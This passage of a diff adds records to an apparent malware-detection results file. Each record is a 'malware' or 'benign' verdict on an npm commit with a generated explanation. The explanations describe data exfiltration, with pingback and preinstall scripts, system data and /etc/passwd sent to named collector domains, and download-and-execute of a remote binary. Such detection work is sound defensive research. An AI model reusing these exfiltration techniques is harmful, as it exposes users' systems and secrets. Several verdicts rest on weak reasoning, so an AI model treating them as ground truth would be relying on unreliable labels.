+    "explanation": "**At line not specified file index.js**:\nCode: `child_process.exec with curl and nslookup commands`\nReason: Executing shell commands with untrusted input is a serious security risk, potentially allowing data exfiltration or other malicious activities.\n\n**At line not specified file index.js**:\nCode: `HTTP request to https://ifconfig.me and nslookup to a potentially malicious domain`\nReason: These network requests could be used for data exfiltration or tracking, indicating potential malware behavior.\n\n**At line not specified file package.json**:\nCode: `'pingback' script making a curl request to https://eo536ohsnextro9.m.pipedream.net`\nReason: This script could be used for tracking or data exfiltration, raising suspicions about its purpose.\n\n**At line not specified file package.json**:\nCode: `'preinstall' script running 'node index.js'`\nReason: Running a potentially compromised or malicious index.js during installation could expose sensitive data or perform harmful operations.\n\n**Summary:** The commit is flagged as malware due to multiple critical and high-severity issues identified during static analysis, including command execution with untrusted input, suspicious network requests, and potentially malicious scripts. Although dynamic analysis did not yield specific results, the static analysis findings are sufficient to classify this commit as malicious."
+  },
+  {
+    "hash": "a7d4ba46dd1771af48db0b4c42eb25b72ba705f8",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `curl request to internal Amazon URL with referrer header 'asf-recorder'`\nReason: Potential leak of internal information\n\n**At line None file package.json**:\nCode: `curl request to external URL in 'pingback' script`\nReason: Potential data exfiltration\n\n**At line None file package.json**:\nCode: `https://psl90hqhazuo4ugxw72jcpaublhb50.oastify.com`\nReason: Suspicious URL potentially used for data exfiltration\n\n**At line None file index.js**:\nCode: `Added 'hacked' function`\nReason: Potential code injection\n\n**Summary:** Multiple critical and high severity issues related to suspicious network access and potential data exfiltration indicate malicious activity."
+  },
+  {
+    "hash": "07b083cfbd7095354bb66c2566c06675766c44dd",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "15b259928200dc5547076186c4cbb7207df85c1d",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file package.json**:\nReason: The static analysis detected suspicious URLs in package.json, but there is no evidence that these URLs are accessed or used maliciously within the application. The dynamic analysis did not reveal any malicious behavior.\n\n**Summary:** Although the static analysis raised a medium-severity issue regarding suspicious URLs in package.json, the dynamic analysis did not detect any malicious activity. Without further evidence of malicious intent or behavior, the commit is considered benign."
+  },
+  {
+    "hash": "bcd7145618b92359215fbc47cda77bf596dcd17a",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `https://eo536ohsnextro9.m.pipedream.net`\nReason: The 'pingback' script makes an HTTP request to a potentially unknown or suspicious endpoint, which could be used for data exfiltration or other malicious activities.\n\n**At line None file lib/cli/DefaultCommand.js**:\nCode: `require(transformPath)`\nReason: The 'getTransform' function uses 'require' to load a module from a user-specified path, potentially leading to code injection if the path is not properly validated.\n\n**Summary:** The commit contains a CRITICAL issue related to suspicious network access and a MEDIUM issue related to potential code injection, indicating malicious intent."
+  },
+  {
+    "hash": "8d9a2efa5fba81ed51b4835309e55d30bf2dc775",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "2463b9222317aeecbecc947165be1ed92bb327d3",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: The code is sending sensitive system information to a suspicious external server and leaking sensitive system information.\n\n**At line None file index.js**:\nReason: The code is accessing sensitive information from package.json, which could be a potential security risk if sent over the network.\n\n**Summary:** The commit is classified as malware due to the presence of critical issues related to suspicious network access and data leaks in the static analysis. The dynamic analysis did not provide additional insights but the static analysis findings are sufficient to determine the commit as malicious."
+  },
+  {
+    "hash": "0313c3238830a3cb96339a1012848d5c68ec9fcc",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `postinstall script`\nReason: The postinstall script downloads and executes a remote script from an untrusted URL, which is a serious security risk as it can lead to arbitrary code execution on the system.\n\n**At line None file package.json**:\nCode: `HTTP request to suspicious URL`\nReason: The postinstall script makes an HTTP request to a suspicious URL, potentially exfiltrating data or downloading malicious content.\n\n**Summary:** The commit is flagged as malware due to the presence of a postinstall script that downloads and executes code from an untrusted source and makes suspicious network requests, indicating a potential for arbitrary code execution and data exfiltration."
+  },
+  {
+    "hash": "d27d3f33cdd0ed624a2334fe33575a5d9bdcb89a",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: Makes an HTTPS request to a potentially malicious URL, which could be used for data exfiltration or other malicious activities.\n\n**At line None file index.js**:\nReason: Uses an immediately invoked function expression (IIFE) which could potentially be used to obfuscate malicious code.\n\n**Summary:** The static analysis revealed two issues, one of high severity related to suspicious network access and another of medium severity related to potential code injection. Although the dynamic analysis did not yield any results, the presence of a high-severity issue in the static analysis is sufficient to classify the commit as malware."
+  },
+  {
+    "hash": "359e8c0b93e9e0aa6472ea6405d83f55efd05e20",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line unknown file src/metrics.js**:\nCode: `sending potentially sensitive system information to an external server`\nReason: The code is sending potentially sensitive system information to an external server without proper user consent or notification, which is a critical security risk.\n\n**At line unknown file package.json**:\nCode: `'pingback' script making an HTTP request to an external server`\nReason: The 'pingback' script is making an HTTP request to an external server, potentially exfiltrating data, which is a high-severity security risk.\n\n**At line unknown file src/metrics.js**:\nCode: `accessing 'process.env.JFROG_ARTIFACTORY_URL' environment variable`\nReason: The code is accessing the 'process.env.JFROG_ARTIFACTORY_URL' environment variable and storing it in the data object being sent to the external server, which could potentially leak sensitive information.\n\n**Summary:** The commit is classified as malware due to the presence of critical and high-severity security risks, including the exfiltration of potentially sensitive system information and environment variables to external servers without proper user consent or notification."
+  },
+  {
+    "hash": "ecacf0e1a49041345fbbfa2535a4b5956599c8bd",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `POST request to 'https://bbqurumzwj9l3fccqqhykfliy940srgg.oastify.com'`\nReason: The domain is suspicious and used for data exfiltration\n\n**At line None file index.js**:\nCode: `Exposing all environment variables via 'process.env'`\nReason: This is a data leak as it exposes potentially sensitive information\n\n**At line None file None**:\nCode: `Unexpected outbound connections to various IPs`\nReason: Dynamic analysis shows the application making unexpected outbound connections, indicating potential malicious activity\n\n**Summary:** The commit is identified as malware due to critical issues found in both static and dynamic analyses, including data leaks to suspicious domains and unexpected outbound network connections."
+  },
+  {
+    "hash": "6309cb1c85c76048d161ed14e62283b740b636ff",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `\"axios\": \"https://registry.storageartifact.com/consul-lock-sessions\"`\nReason: The 'axios' dependency is sourced from a suspicious registry URL instead of a standard npm registry, indicating potential malware.\n\n**At line None file package.json**:\nCode: `START_REPLICA_SET=1 mocha --exit`\nReason: The use of 'START_REPLICA_SET=1' environment variable and '--exit' flag with Mocha can potentially hide test failures and allow malicious code execution.\n\n**At line None file package.json**:\nCode: `deno test --allow-run --allow-write`\nReason: The '--allow-run' and '--allow-write' flags granted to Deno can potentially allow malicious code execution.\n\n**At line None file None**:\nCode: `Unexpected outbound connection destinations (172.67.175.222, 104.21.83.128)`\nReason: Dynamic analysis revealed unexpected outbound connections to suspicious IP addresses, indicating potential malware activity.\n\n**Summary:** The commit is classified as malware due to the presence of suspicious dependencies, potentially risky environment variables and flags, and unexpected outbound connections to suspicious IP addresses during dynamic analysis."
+  },
+  {
+    "hash": "d928529c79508fc4306a37b1ff308d48281a62e4",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: Makes an HTTPS request to a suspicious domain 'exzuperi.ftp.sh' on a non-standard port 449, potentially exfiltrating sensitive system information.\n\n**At line None file index.js**:\nReason: Collects and exfiltrates sensitive system information such as homedir, hostname, and current directory.\n\n**At line None file package.json**:\nReason: Contains a suspicious message 'exzuperi made me' in the 'test' script, potentially indicating a backdoor or hidden message.\n\n**Summary:** The commit is classified as malware due to its suspicious network activity, data exfiltration, and potential backdoor or hidden message in the 'test' script."
+  },
+  {
+    "hash": "d6ffd09159737510b7f27d087d3808e825dd672c",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file package.json**:\nCode: `request package being added`\nReason: The addition of the 'request' package is flagged as suspicious due to its potential for making arbitrary HTTP requests. However, without evidence of malicious usage, this alone is not conclusive of malware.\n\n**At line None file .github/workflows/npmpublish.yml**:\nCode: `NODE_AUTH_TOKEN being used`\nReason: The use of NODE_AUTH_TOKEN for publishing to npm is a common practice and is not inherently malicious if properly secured.\n\n**At line None file package.json**:\nCode: `'sqlite3' dependency`\nReason: The presence of 'sqlite3' is noted, but its usage is not directly related to malicious activities without further context.\n\n**Summary:** The static analysis raised several concerns, but none were conclusive of malware. The dynamic analysis did not reveal any malicious behavior. The commit appears to be related to a legitimate npm publish workflow, and the flagged items are either common practices or not directly indicative of malware."
+  },
+  {
+    "hash": "26af85890c528d5e4ddc228d6a7b5671874f6a54",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "966b0458f552718d344a1526335c77fac764dab9",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file index.js**:\nCode: `Sending sensitive system information to '48aaaghr2dnasvz7xa0qtdrscjik6auz.oastify.com' via HTTPS POST request`\nReason: The domain appears to be suspicious and is potentially used for data exfiltration or tracking, indicating malicious activity.\n\n**At line N/A file index.js**:\nCode: `Collecting and sending sensitive system information including __dirname, os.homedir(), os.hostname(), os.userInfo().username, dns.getServers(), and package.json contents`\nReason: This data is being sent to an external server, potentially leaking sensitive information, which is a characteristic of malware.\n\n**Summary:** The commit is classified as malware due to its suspicious network activity and potential data leaks, indicating a possible data exfiltration or tracking intent."
+  },
+  {
+    "hash": "8739370a563ef4205bd4a7c125487298167f7b12",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not reveal any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "38b1b18310abef5565fd25fbe3d55d061ad0257f",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "5b1ce2ae4efa06dc6f62d1ff846a1719f03694ed",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not specified file index.js**:\nCode: `HTTPS request to 'exzuperi.ftp.sh' on port 449`\nReason: This is a suspicious network access that could be used for data exfiltration or communication with a potentially malicious server.\n\n**At line not specified file index.js**:\nCode: `Collecting system information like homedir, hostname, and current directory`\nReason: This could be a data leak or an attempt to gather sensitive information about the system.\n\n**At line not specified file package.json**:\nCode: `Test script containing a message referencing 'exzuperi'`\nReason: The reference to 'exzuperi' in the test script could indicate a connection to the suspicious network request, suggesting a potential malicious activity.\n\n**Summary:** The commit is classified as malware due to the presence of a critical severity issue related to suspicious network access, potential data leaks, and obfuscation techniques. The static analysis revealed several red flags, including a suspicious HTTPS request and the collection of sensitive system information. Although the dynamic analysis did not yield any results, the static analysis findings are sufficient to classify the commit as malicious."
+  },
+  {
+    "hash": "be91815b46dd5bea39c0c5a28917705ac2432365",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not available file index.js**:\nCode: `sending sensitive system information via HTTPS POST request`\nReason: This behavior is indicative of malware as it involves exfiltrating sensitive system information to an external domain without user consent.\n\n**At line not available file index.js**:\nCode: `collecting homedir, hostname, username, and network interfaces`\nReason: Collecting such detailed system information is suspicious and can be used for malicious purposes, indicating potential malware activity.\n\n**Summary:** The static analysis revealed critical and high-severity issues related to suspicious network access and data leaks, indicating the commit is likely to be malware. The dynamic analysis did not provide additional insights but did not contradict the static analysis findings."
+  },
+  {
+    "hash": "e3eb6101b2efdb78e155acdbeadba520f369105c",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file index.js**:\nCode: `cheerio.load(html)`\nReason: Potential code injection vulnerability through the use of `cheerio.load(html)` with untrusted input.\n\n**At line N/A file utils.js**:\nCode: `https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110`\nReason: Suspicious HTTP request with sensitive data, potentially indicating malicious activity.\n\n**At line N/A file utils.js**:\nCode: `getAppState`\nReason: Potential data leak through the `getAppState` function which returns cookies containing sensitive information.\n\n**Summary:** The commit contains critical and high-severity issues, including potential code injection, suspicious network access, and data leaks, indicating malicious intent."
+  },
+  {
+    "hash": "0cdadc08cac9cf9e76594250684d3a06018e59ef",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `POST request to '8hqsazb9n32zxshfc7cakdpiz950tqhf.oastify.com'`\nReason: Sending sensitive system information to an external server is a strong indicator of malicious activity, potentially exfiltrating data.\n\n**At line None file index.js**:\nCode: `Collecting and sending system information (homedir, hostname, username, DNS servers)`\nReason: This behavior is characteristic of malware, as it collects and exfiltrates sensitive system data.\n\n**At line None file package.json**:\nCode: `'pingback' script making a curl request to 'https://eo536ohsnextro9.m.pipedream.net'`\nReason: This could be used for tracking or additional data exfiltration, supporting the suspicion of malicious intent.\n\n**Summary:** The commit is classified as malware due to its behavior of exfiltrating sensitive system information and making suspicious network requests, indicating potential malicious activity."
+  },
+  {
+    "hash": "eedfb7848535784f9502327a3ea0f34369347d05",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not reveal any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "74fc536d4db7d26092965fb72613febd1867e41d",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file package.json**:\nReason: The static analysis flagged the mention of a URL shortener service (https://blltly.com/2thgNN) in the commit message or surrounding context as suspicious. However, without further evidence of malicious activity, this alone is not conclusive evidence of malware.\n\n**Summary:** The static analysis raised a low-severity issue regarding the use of a URL shortener service, but the dynamic analysis did not reveal any malicious behavior. Without concrete evidence of malicious activity, the commit is considered benign."
+  },
+  {
+    "hash": "35bf02c1724128a4b8a71eac02f7a21043bc9620",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `node-red`\nReason: The 'start' script executes 'node-red' directly, potentially leading to command injection if input is not sanitized.\n\n**At line None file package.json**:\nCode: `https://eo536ohsnextro9.m.pipedream.net`\nReason: The 'pingback' script makes an HTTP request to a potentially external URL, which could be used for data exfiltration or other malicious activities.\n\n**At line None file ccxt-v2/ccxt-api.js**:\nReason: The code involves cryptocurrency exchange APIs and handles sensitive information like API keys and secrets, indicating potential crypto-related activities or risks if not handled securely.\n\n**Summary:** The commit is flagged as malware due to potential command injection, suspicious network access for data exfiltration, and handling of sensitive cryptocurrency API information, indicating possible malicious activities or significant security risks."
+  },
+  {
+    "hash": "70bfbb27bed6e880aec92018d8f19c4bb34629a3",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "cd0a3b541aafd6def3731d1af509cea0f3a17935",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `pingback script`\nReason: The 'pingback' script makes an HTTP request to a potentially suspicious external URL, indicating potential data exfiltration or unauthorized actions.\n\n**Summary:** The static analysis revealed a critical issue related to suspicious network access via the 'pingback' script in package.json, suggesting malicious activity. Although the dynamic analysis did not yield any results, the presence of a critical issue in the static analysis is sufficient to raise concerns about the commit's intent."
+  },
+  {
+    "hash": "62e82314a910e14997b88c18dc452299fbd98e68",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nReason: New dependencies are added with suspicious URLs detected, indicating potential malicious activity.\n\n**At line None file None**:\nReason: The presence of 'eval' and 'function' in suspicious patterns suggests potential code injection risks.\n\n**Summary:** The commit is flagged as malware due to the presence of suspicious network access and potential code injection risks identified during static analysis."
+  },
+  {
+    "hash": "00eab55e3a32296c8030c15c058b8fc110f8e089",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file Unknown (commit message)**:\nReason: Potential cryptocurrency-related malicious activities detected, indicating possible malware behavior.\n\n**At line None file Unknown (commit message)**:\nReason: Potential command injection vulnerability detected, which is a common trait of malware for executing unauthorized commands.\n\n**At line None file Unknown (commit message)**:\nReason: Suspicious network URLs detected, potentially used for data exfiltration or other malicious activities, a characteristic of malware.\n\n**Summary:** The static analysis revealed multiple critical and high-severity issues indicative of malware behavior, including cryptocurrency-related activities, command injection vulnerabilities, and suspicious network access. Although the dynamic analysis did not yield specific results, the static analysis findings are sufficient to classify the commit as malware."
+  },
+  {
+    "hash": "f72f09299f08019a099c2bad07dc7029c122361b",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `child_process.exec`\nReason: The use of child_process.exec can lead to arbitrary command execution, which is a critical security risk.\n\n**At line None file index.js**:\nCode: `curl request to https://ifconfig.me and sends output to oastify.com`\nReason: This behavior is indicative of data exfiltration, a common trait of malware.\n\n**At line None file package.json**:\nCode: `'pingback' script makes a curl request to https://eo536ohsnextro9.m.pipedream.net`\nReason: This could be used for tracking or data exfiltration, suggesting malicious activity.\n\n**At line None file index.js**:\nCode: `xxd -p to hex encode output`\nReason: This obfuscation technique is often used to hide malicious activity.\n\n**Summary:** The commit contains multiple indicators of malicious activity, including arbitrary command execution, data exfiltration, and obfuscation techniques, leading to the conclusion that it is malware."
+  },
+  {
+    "hash": "a33eac697ae5f0f9902ec8de6982ff0978094c59",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "23e60d3a558a991237d180690dff6fbf4b98b57c",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "896a4604e211f29ef4b1b257bcc87799431b674e",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file index.js**:\nCode: `N/A`\nReason: The code is exfiltrating sensitive information (external IP, username, OS version, hostname) to a suspicious domain via DNS lookup, indicating potential malicious activity.\n\n**At line N/A file package.json**:\nCode: `N/A`\nReason: The 'preinstall' script makes a network request to a suspicious domain 'go4wda46okp7rjtmwqiqr09rt.canarytokens.com', which is a strong indicator of malicious behavior.\n\n**At line N/A file package.json**:\nCode: `N/A`\nReason: The 'pingback' script makes an HTTP request to 'https://eo536ohsnextro9.m.pipedream.net', which could be used for tracking or data exfiltration, raising suspicions about the intent of the code.\n\n**Summary:** The commit is classified as malware due to the presence of multiple indicators of malicious activity, including the exfiltration of sensitive information and suspicious network requests to potentially malicious domains."
+  },
+  {
+    "hash": "280f539bba94abf5e50dd0ff5273c3d16c65c6ff",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "527a9be6b5c2462f15fffa2cc79e0796115e7d9c",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file package.json**:\nCode: `emonn-test: ^1.999.0`\nReason: Although the addition of 'emonn-test' with version '^1.999.0' is flagged as critical due to potential maliciousness, without further context or evidence of malicious activity, it's considered a potential risk rather than definitive malware.\n\n**At line None file Samples~/RMC Mini MVCS Examples/Tutorial/Tutorial/Shared/Dialogs/Dialogs/Welcome Dialog/Mini MVCS - Welcome Dialog.asset**:\nCode: `https://bit.ly/mvc-architecture-for-unity-on-udemy`\nReason: The use of a shortened URL could be suspicious, but it links to a potentially legitimate Udemy course, suggesting it's likely benign.\n\n**At line None file .github/workflows/on-release.yml**:\nCode: `NODE_AUTH_TOKEN`\nReason: The use of 'NODE_AUTH_TOKEN' as a secret is a common practice for CI/CD pipelines and is considered secure when properly managed.\n\n**At line None file .github/CODEOWNERS**:\nCode: `* @rmc/Games`\nReason: Assigning ownership to all files to '@rmc/Games' via a wildcard could be seen as overly broad, but it's a legitimate administrative action within the project's context.\n\n**Summary:** The static analysis raised several issues, but upon review, they are either related to potentially legitimate activities or common practices that are not inherently malicious. The dynamic analysis did not reveal any malicious behavior. Therefore, the commit is considered benign."
+  },
+  {
+    "hash": "4a5a797fac962129ec09fbc32c91ec174f0a3a4c",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: Executes a shell command with untrusted input, potentially leading to command injection attacks.\n\n**At line None file index.js**:\nReason: Makes a curl request to https://ifconfig.me and sends the result to an OASTIFY domain, potentially exfiltrating sensitive data.\n\n**At line None file package.json**:\nReason: The 'pingback' script makes a curl request to https://eo536ohsnextro9.m.pipedream.net, potentially exfiltrating data.\n\n**Summary:** The commit contains multiple indicators of malicious behavior, including potential command injection, data exfiltration, and suspicious network requests, suggesting that it is malware."
+  },
+  {
+    "hash": "eeca4bab1e2013adc38bd9f05aeabf37414125b2",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line unknown file package.json**:\nCode: `pingback script making HTTP request to https://eo536ohsnextro9.m.pipedream.net`\nReason: The 'pingback' script is making an unexpected HTTP request to an external server, which could be a potential data exfiltration point.\n\n**Summary:** The static analysis revealed a critical issue with a suspicious network access, indicating a potential data exfiltration point. Although the dynamic analysis did not yield any results, the static analysis findings are sufficient to classify the commit as malware."
+  },
+  {
+    "hash": "6000b88b67627cd322ef293a3de568eeeec4ea39",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `Downloads and executes an executable file from a Discord CDN URL`\nReason: This behavior is highly suspicious and poses a significant security risk as it can lead to arbitrary code execution.\n\n**At line None file obf/index.js**:\nCode: `Obfuscated code that downloads and executes an executable`\nReason: The use of obfuscation combined with downloading and executing external executables is a strong indicator of malicious intent.\n\n**Summary:** The commit is classified as malware due to its behavior of downloading and executing external executables from untrusted sources, combined with the use of obfuscated code. These actions pose significant security risks and are characteristic of malicious software."
+  },
+  {
+    "hash": "e470e52cbdea0bf4a7c8a3c7033fa59d1d6a0f23",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line unknown file index.js**:\nCode: `sending sensitive system information to 'ck09rg22vtc0000gqmrggjorhecyyyyyb.oast.fun' via HTTPS POST request`\nReason: The domain 'ck09rg22vtc0000gqmrggjorhecyyyyyb.oast.fun' is suspicious and the data being sent includes sensitive system information such as homedir, hostname, username, and DNS servers, which is a potential security risk.\n\n**At line unknown file index.js**:\nCode: `leaking sensitive system information`\nReason: The code is leaking sensitive system information, which could be used for malicious purposes.\n\n**Summary:** The commit is classified as malware due to its suspicious network activity and data leaks, indicating potential malicious intent."
+  },
+  {
+    "hash": "c5951d8286738d2bc7679aae3dd2e4abfb21d1bd",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `exec function from 'child_process' with potentially untrusted input`\nReason: The use of 'exec' with potentially untrusted input is a critical code injection vulnerability.\n\n**At line None file index.js**:\nCode: `HTTPS request to 'bhfvohxbvhtizkooshbfgbrkras3cig6i.oast.fun'`\nReason: The domain 'bhfvohxbvhtizkooshbfgbrkras3cig6i.oast.fun' is suspicious and could be indicative of data exfiltration or other malicious activity.\n\n**At line None file index.js**:\nCode: `Heavily obfuscated code`\nReason: The code is heavily obfuscated, making it difficult to understand its intent, which is a common trait of malware.\n\n**Summary:** The commit contains critical code injection vulnerabilities, suspicious network access, and is heavily obfuscated, indicating malicious intent."
+  },
+  {
+    "hash": "9ddfe6d493d1aea6e062645ddd80252ca49d7e94",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file src/scrapers/applications.ts**:\nCode: `safeEval(escodegen.generate(elementsObject)) and safeEval(escodegen.generate(sectionsObject))`\nReason: Potential code injection vulnerability through the use of `safeEval` function with user-controlled input, which could lead to arbitrary code execution.\n\n**At line None file src/util/request.ts**:\nCode: `postRequest and getRequest functions`\nReason: Makes HTTP requests to potentially arbitrary URLs, which could be exploited for SSRF (Server-Side Request Forgery) attacks.\n\n**At line None file src/util/request.ts**:\nCode: `Logging of session_id, password, email, and api_key`\nReason: Sensitive information is logged or exposed in debug mode, potentially leading to data leaks.\n\n**At line None file src/util/config.ts**:\nCode: `getConfig function`\nReason: Stores sensitive configuration values in a file named `config.json`, which may not be properly secured.\n\n**Summary:** The commit contains multiple critical and high-severity issues, including potential code injection, SSRF, data leaks, and insecure storage of sensitive information, indicating malicious intent."
+  },
+  {
+    "hash": "279896f835c38c411a27ba68b5ce875531734acf",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "d1c5dff4d99dec6e6a5f31ac87001f7b14b0932a",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "31fd4f37ca1dbcc74557401c29f395f772ae0b3e",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `POST request to mukcn06ozkmmu8xqeet91hy9s0yqmf.burpcollaborator.net`\nReason: The domain appears to be suspicious and is flagged for potential data exfiltration or other malicious activities.\n\n**Summary:** The commit is flagged as malware due to a critical issue identified in the static analysis, where the code makes a POST request to a suspicious domain, indicating potential malicious activity."
+  },
+  {
+    "hash": "e9ba800375a19e507ccd2a00cffdfee859ba1675",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file three.module.js**:\nReason: The presence of 'eval' or 'Function' is flagged as CRITICAL due to potential code injection vulnerabilities, but without specific context or line numbers, it's hard to determine if it's used maliciously. Three.js is a known library that sometimes uses such constructs for legitimate purposes.\n\n**At line None file three.module.js**:\nReason: The use of 'String.fromCharCode' or 'atob' is noted, which can be used for obfuscation. However, three.js is known to use these for legitimate purposes such as encoding/decoding.\n\n**At line None file three.module.js**:\nReason: The presence of 'XMLHttpRequest' indicates network access, which is a common requirement for many libraries including three.js for loading resources.\n\n**Summary:** While static analysis raised several flags, they are either related to known practices in the three.js library or are not conclusive without further context. Dynamic analysis did not reveal any malicious behavior. Therefore, based on the information provided, the commit is considered benign."
+  },
+  {
+    "hash": "701926878922e20798b6452c8854c18b47072314",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file index.js**:\nCode: `N/A`\nReason: Sending a POST request to a suspicious domain with sensitive system information.\n\n**At line N/A file package.json**:\nCode: `N/A`\nReason: The 'pingback' script is making a curl request to a suspicious URL.\n\n**At line N/A file index.js**:\nCode: `N/A`\nReason: Collecting and sending sensitive system information to an external server.\n\n**Summary:** The commit contains multiple critical and high-severity issues, including sending sensitive system information to a suspicious domain and making a curl request to a suspicious URL, indicating malicious behavior."
+  },
+  {
+    "hash": "a27375be51cbdc7d3dd103e901d3f1b8cb8819b8",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file pre.sh**:\nCode: `curl command sending sensitive information to http://hh2jrafy3z3xpdaa73mqi27ig9m0a1yq.oastify.com`\nReason: Sending sensitive information like hostname, whoami, pwd, ls -la to an external server is a strong indicator of malicious activity.\n\n**At line N/A file index.js**:\nCode: `child_process.exec curl command sending sensitive information to http://hh2jrafy3z3xpdaa73mqi27ig9m0a1yq.oastify.com`\nReason: Executing a curl command using child_process.exec and sending sensitive information to an external server is a critical security risk.\n\n**At line N/A file package.json**:\nCode: `'pingback' script sending a request to https://eo536ohsnextro9.m.pipedream.net`\nReason: The presence of a 'pingback' script that sends a request to an external server could be used for malicious purposes like confirming the existence of a compromised system.\n\n**At line N/A file index.js.bak**:\nCode: `child_process.exec curl command sending /etc/passwd to an external server`\nReason: Sending /etc/passwd to an external server is a serious security breach as it contains user information.\n\n**Summary:** The commit is classified as malware due to multiple critical issues identified in the static analysis, including sending sensitive information to external servers and executing suspicious commands. The presence of these issues across multiple files indicates a malicious intent."
+  },
+  {
+    "hash": "a0b9a69d8c83952288dc26aef0cbe88266494456",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file package.json**:\nCode: `npx chromatic with project token`\nReason: The use of a project token with `npx chromatic` could potentially expose sensitive information, but it's a common practice in development environments and can be mitigated by using environment variables or secure configuration files.\n\n**At line None file babel.config.cjs**:\nCode: `process.env.NODE_ENV`\nReason: Direct access to `process.env.NODE_ENV` could lead to unexpected behavior if not sanitized, but it's a common and generally safe practice if properly validated.\n\n**At line None file src/index.cjs**:\nCode: `require('@babel/register')({ ignore: [] })`\nReason: The configuration of `@babel/register` with an empty `ignore` array could potentially lead to code injection, but proper configuration can mitigate this risk.\n\n**Summary:** The static analysis revealed some potential security issues, but they are either low severity or common practices that can be mitigated with proper configuration and validation. The dynamic analysis did not reveal any malicious behavior. Therefore, the commit is considered benign."
+  },
+  {
+    "hash": "18d0f143a9c853aa1ce76f18269e3aa7d7856c7b",
+    "sample_folder": "mongoose",
+    "predict": "malware",
